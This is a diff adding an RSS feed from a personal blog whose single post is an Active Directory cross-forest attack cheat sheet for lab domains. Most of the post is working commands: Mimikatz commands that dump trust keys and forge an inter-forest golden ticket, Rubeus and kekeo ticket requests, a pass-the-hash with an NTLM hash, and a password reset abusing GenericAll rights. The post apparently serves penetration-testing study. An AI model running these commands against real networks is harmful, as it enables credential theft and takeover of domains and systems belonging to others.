@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Forests | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/forests/</link><atom:link href="https://www.peco602.com/tag/forests/index.xml" rel="self" type="application/rss+xml"/><description>Forests</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Thu, 15 Sep 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Forests</title><link>https://www.peco602.com/tag/forests/</link></image><item><title>Across Forests Cheatsheet</title><link>https://www.peco602.com/post/0060-across-forests-cheatsheet/</link><pubDate>Thu, 15 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0060-across-forests-cheatsheet/</guid><description>&lt;h2 id="using-trust-tickets">Using Trust Tickets&lt;/h2>
+&lt;p>Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for foreign group memberships between forests.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Once again, we require the trust key for the inter-forest trust:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::trust /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># or&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>An inter-forest TGT can be forged:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="s2">&amp;#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:evilcorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># asktgs.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">asktgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_forest_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Use the TGS to access the targeted service.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># kirbikator.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">kirbikator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">lsa&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Now you can access the trusted forest shares:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">forestshare&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>Alternatively, it is possible to use &lt;code>Kekeo&lt;/code> to ask for the TGS:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgs&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_forest_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">service&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">evilcorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="search-for-foreign-security-prinicpals">Search for Foreign Security Prinicpals&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>To search for Foreign Security Principals (users who have joined groups in the trusted domain but are part of the first domain) we can use the below PowerView command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ForeignUser&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ForeignGroup&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>We get an ObjectSID that we have to search in our current domain to see if it exists:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">objectsid&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;S-1-5-21-738119705-704267045-3387619857-1275&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>The ObjectSID corresponds to STUDENT2. Let’s impersonate STUDENT2 who is a user of the domain cybercorp.local:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikats&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /user:STUDENT2 /domain:cybercorp.local /ntlm:6b164d3b190489426e9bcb4a01df5b53 /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Then we can access the other forest:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">evil-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="search-for-interesting-acls">Search for interesting ACLs&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Search for interesting ACLs in the evilcorp.local forest filtering the results belonging to users in our current domain:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentitySID&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;S-1-5-21-738119705-704267045-3387619857&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>The user STUDENT1 in our cyberlab.cybercorp.local has GenericAll rights on STUDENT3 in evilcorp.local. This means, interesting stuff, like password reset can be done on STUDENT3 (using Powerview dev):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainUserPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="n">STUDENT3&lt;/span> &lt;span class="n">-AccountPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;hr></description></item></channel></rss>
